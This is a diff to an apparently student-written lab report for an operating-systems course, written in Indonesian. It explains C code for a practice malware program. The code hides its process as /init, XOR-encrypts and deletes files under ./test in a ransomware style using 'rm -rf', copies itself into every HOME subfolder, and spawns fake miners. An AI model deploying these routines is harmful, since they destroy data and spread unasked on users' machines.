@@ -327,6 +327,219 @@ password: BewareOfAmpy
 ## Soal_2
 
 ## Soal_3
+A. Malware ini bekerja secara daemon dan menginfeksi perangkat korban dan menyembunyikan diri dengan mengganti namanya menjadi `/init`.
+
+```
+void daemonize() {
+    pid_t pid = fork();
+    if (pid > 0) exit(0);     // Parent process keluar
+    if (pid < 0) exit(1);     // Fork gagal
+
+    setsid();                 // Membuat session baru agar menjadi daemon
+    pid = fork();
+    if (pid > 0) exit(0);     // Exit dari session leader
+
+    chdir("/");               // Ganti direktori kerja ke root
+    fclose(stdin); 
+    fclose(stdout); 
+    fclose(stderr);           // Tutup file descriptor standar
+
+    prctl(PR_SET_NAME, "/init");  // Ganti nama proses menjadi /init
+}
+```
+- Forking 2 Kali: Membuat proses menjadi tidak memiliki controlling terminal dan benar-benar berjalan di background.
+- `setsid()`: Membuat proses menjadi session leader agar benar-benar terpisah dari terminal.
+- `prctl(PR_SET_NAME, "/init")`: Mengubah nama proses di sistem menjadi /init.
+
+B. Mengimplementasikan fitur wannacryptor yang bertugas untuk melakukan enkripsi pada seluruh file dan folder yang terdapat di direktori target (./test), dengan menggunakan metode XOR berdasarkan timestamp saat program dijalankan.
+Untuk kelompok genap, enkripsi folder dilakukan dengan mengubah folder dan isinya menjadi file `.zip`, kemudian file `.zip` tersebut dienkripsi menggunakan XOR dan folder asli akan dihapus.
+
+```
+void xor_encrypt(const char *path) {
+    FILE *f = fopen(path, "rb+");
+    if (!f) return;
+    fseek(f, 0, SEEK_END);
+    long size = ftell(f);
+    rewind(f);
+
+    char *buffer = malloc(size);
+    if (!buffer) {
+        fclose(f);
+        return;
+    }
+    fread(buffer, 1, size, f);
+    rewind(f);
+    for (long i = 0; i < size; i++)
+        buffer[i] ^= timestamp_key[i % strlen(timestamp_key)];
+    fwrite(buffer, 1, size, f);
+
+    free(buffer);
+    fclose(f);
+}
+```
+menggunakan metode XOR sederhana untuk mengenkripsi file. Kunci enkripsi didasarkan pada timestamp saat program dijalankan, sehingga hasil enkripsinya berbeda setiap kali program dijalankan.
+
+```
+void zip_and_encrypt(const char *folder_path) {
+    char zip_cmd[8192];
+    snprintf(zip_cmd, sizeof(zip_cmd), "zip -r -q '%s.zip' '%s' && rm -rf '%s'", folder_path, folder_path, folder_path);
+    system(zip_cmd);  // Jalankan perintah zip dan hapus folder
+
+    char zip_file[4096];
+    snprintf(zip_file, sizeof(zip_file), "%s.zip", folder_path);
+    xor_encrypt(zip_file);  // Enkripsi file zip
+}
+```
+Folder dikompresi menjadi `.zip`, lalu hasil file `.zip` akan dienkripsi. Folder aslinya kemudian dihapus secara permanen.
+
+```
+void wannacryptor(const char *target) {
+    DIR *dir = opendir(target);
+    if (!dir) return;
+
+    struct dirent *entry;
+    while ((entry = readdir(dir)) != NULL) {
+        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;
+
+        char path[4096];
+        snprintf(path, sizeof(path), "%s/%s", target, entry->d_name);
+
+        struct stat st;
+        if (stat(path, &st) == -1) continue;
+
+        if (S_ISDIR(st.st_mode)) {
+            zip_and_encrypt(path);  // Kelompok GENAP
+        } else if (S_ISREG(st.st_mode)) {
+            xor_encrypt(path);  // Enkripsi file langsung
+        }
+    }
+    closedir(dir);
+}
+```
+Program memindai semua isi direktori target (./test). Bila menemukan folder, dilakukan zip + enkripsi. Bila menemukan file biasa, langsung dienkripsi.
+
+```
+void *loop_crypto(void *arg) {
+    while (1) {
+        wannacryptor(FOLDER_TARGET);
+        sleep(30);
+    }
+}
+```
+Fungsi wannacryptor dipanggil setiap 30 detik dalam thread `loop_crypto`, sehingga proses enkripsi berjalan terus-menerus di background.
+
+C. Fitur trojan.wrm bertugas menyebarkan malware dengan cara menduplikasi file binary malware (runme) ke seluruh direktori yang ada di dalam folder HOME milik user.
+
+```
+void replicate_malware() {
+    char *home = getenv("HOME");
+    if (!home) return;
+    DIR *dir = opendir(home);
+    if (!dir) return;
+
+    struct dirent *entry;
+    while ((entry = readdir(dir)) != NULL) {
+        if (entry->d_type != DT_DIR) continue;
+        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;
+
+        char folder_path[2048];
+        snprintf(folder_path, sizeof(folder_path), "%s/%s", home, entry->d_name);
+
+        DIR *sub = opendir(folder_path);
+        if (!sub) continue;
+        closedir(sub);
+
+        char dest[4096];
+        snprintf(dest, sizeof(dest), "%s/runme", folder_path);
+
+        FILE *src = fopen("./runme", "rb");
+        FILE *dst = fopen(dest, "wb");
+        if (src && dst) {
+            char buf[1024];
+            size_t n;
+            while ((n = fread(buf, 1, sizeof(buf), src)) > 0)
+                fwrite(buf, 1, n, dst);
+        }
+        if (src) fclose(src);
+        if (dst) fclose(dst);
+    }
+    closedir(dir);
+}
+```
+Fungsi `replicate_malware` akan:
+- Mengambil path dari environment variable HOME
+- Membuka semua subdirektori di dalam folder HOME
+- Untuk setiap subdirektori, membuat salinan file ./runme (yaitu binary malware ini sendiri) ke dalam subfolder tersebut
+
+```
+void *loop_replicate(void *arg) {
+    while (1) {
+        replicate_malware();
+        sleep(30);
+    }
+}
+```
+Agar malware terus menyebar, proses ini dijalankan dalam thread yang mengulang setiap 30 detik.
+
+```
+void start_trojan() {
+    prctl(PR_SET_NAME, "trojan.wrm");  // Nama proses
+    pthread_t t;
+    pthread_create(&t, NULL, loop_replicate, NULL);
+    pthread_join(t, NULL);
+}
+```
+Thread `loop_replicate` akan dijalankan oleh proses anak yang dinamai `trojan.wrm`.
+
+D. Fitur ketiga bernama rodok.exe dirancang untuk menjalankan fork bomb, yaitu proses yang akan membuat banyak proses anak secara terus-menerus. Namun berbeda dari fork bomb biasa, setiap proses yang dibuat oleh rodok.exe berperan sebagai cryptominer palsu yang secara berkala menulis hash acak ke dalam log file.
+
+```
+void start_rodok() {
+    prctl(PR_SET_NAME, "rodok.exe");
+    for (int i = 0; i < MAX_MINER; i++) {
+        pid_t pid = fork();
+        if (pid == 0) {
+            pthread_t t;
+            int *id = malloc(sizeof(int));
+            *id = i;
+            pthread_create(&t, NULL, mine_crafter, id);
+            pthread_join(t, NULL);
+            exit(0);
+        }
+    }
+    while (1) pause();
+}
+```
+Proses rodok.exe akan membuat 4 child process (jumlah ditentukan dengan MAX_MINER). Masing-masing proses akan menjalankan thread `mine_crafter`.
+
+```
+void *mine_crafter(void *arg) {
+    int id = *(int *)arg;
+    char name[32];
+    snprintf(name, sizeof(name), "mine-crafter-%d", id);
+    prctl(PR_SET_NAME, name);
+
+    char logpath[] = "/tmp/.miner.log";
+    while (1) {
+        char *hash = random_hash();
+        FILE *f = fopen(logpath, "a");
+        if (f) {
+            time_t now = time(NULL);
+            struct tm *t = localtime(&now);
+            fprintf(f, "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
+                t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
+                t->tm_hour, t->tm_min, t->tm_sec,
+                id, hash);
+            fclose(f);
+        }
+        sleep(rand() % 28 + 3);  // delay acak agar realistis
+    }
+    return NULL;
+}
+```
+- Setiap proses `mine-crafter-<id>` akan menghasilkan hash acak sepanjang 64 karakter hex.
+- Hasil hash akan disimpan di file log tersembunyi: `/tmp/.miner.log`.
+- Setiap hash dicatat bersamaan dengan timestamp dan ID proses miner.
 
 ## Soal_4
 
